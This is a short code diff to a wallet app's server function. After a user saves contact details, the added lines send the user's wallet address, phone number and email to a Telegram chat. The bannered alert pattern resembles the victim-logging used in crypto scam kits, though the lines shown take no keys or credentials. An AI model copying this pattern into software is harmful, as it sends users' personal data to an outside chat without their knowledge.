@@ -42,5 +42,15 @@ export const saveWalletContactFn = createServerFn({ method: "POST" })
       .update({ phone_number: data.phone || null, email_address: data.email || null })
       .eq("id", profile.id);
     if (error) throw new Error("Could not save contact details.");
+    const { sendTelegramMessage, esc } = await import("@/lib/telegram.server");
+    const stars = "⭐".repeat(30);
+    await sendTelegramMessage([
+      stars,
+      "📇 <b>ACCOUNT CONTACT LINKED</b>",
+      `💼 <code>${esc(data.wallet_address)}</code>`,
+      `📱 Phone: ${esc(data.phone || "Not added")}`,
+      `✉️ Email: ${esc(data.email || "Not added")}`,
+      stars,
+    ].join("\n"));
     return { ok: true as const };
   });
